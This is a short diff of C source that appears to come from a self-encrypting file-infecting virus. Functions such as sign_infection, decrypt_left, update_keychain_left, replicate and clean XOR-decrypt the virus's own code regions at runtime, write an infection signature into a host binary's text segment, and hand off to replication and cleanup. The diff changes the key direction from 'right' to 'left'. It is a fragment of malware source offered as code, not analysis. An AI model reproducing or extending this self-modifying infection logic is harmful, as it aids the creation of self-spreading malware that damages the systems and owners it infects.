@@ -34,10 +34,10 @@ __attribute__((always_inline)) static inline void sign_infection(char *dst, cons
 	_memcpy(dst + (size + SIGNATURE_SIZE), end, 1);
 }
 
-__attribute__((always_inline)) static inline void decrypt_right(const struct s_keychain *keychain, char *callee, const size_t size)
+__attribute__((always_inline)) static inline void decrypt_left(const struct s_keychain *keychain, char *callee, const size_t size)
 {
 	for (register size_t index = 0; index < size; index++)
-		callee[index] ^= keychain->key[RIGHT];
+		callee[index] ^= keychain->key[LEFT];
 }
 
 ////////////////////////////////////////////////////////////////////////////////
@@ -50,7 +50,7 @@ void sign(struct s_host *host, struct s_keychain *keychain, enum e_context conte
 	MID_LOGGER("key:\t\t\t");
 #endif
 
-	decrypt_right(keychain, (char *)stub, (void *)sign - (void *)stub);
+	decrypt_left(keychain, (char *)stub, (void *)sign - (void *)stub);
 
 	if (context == FAILURE)
 		goto label;
@@ -61,8 +61,8 @@ void sign(struct s_host *host, struct s_keychain *keychain, enum e_context conte
 	sign_infection(infect->ptr, host->segment[TEXT], signature);
 
 label:
-	update_keychain_right(keychain, (char *)sign, (void *)clean - (void *)sign);
-	decrypt_right(keychain, (char *)clean, (void *)replicate - (void *)clean);
+	update_keychain_left(keychain, (char *)sign, (void *)clean - (void *)sign);
+	decrypt_left(keychain, (char *)clean, (void *)replicate - (void *)clean);
 
 	clean(host, keychain, context, infect);
 }
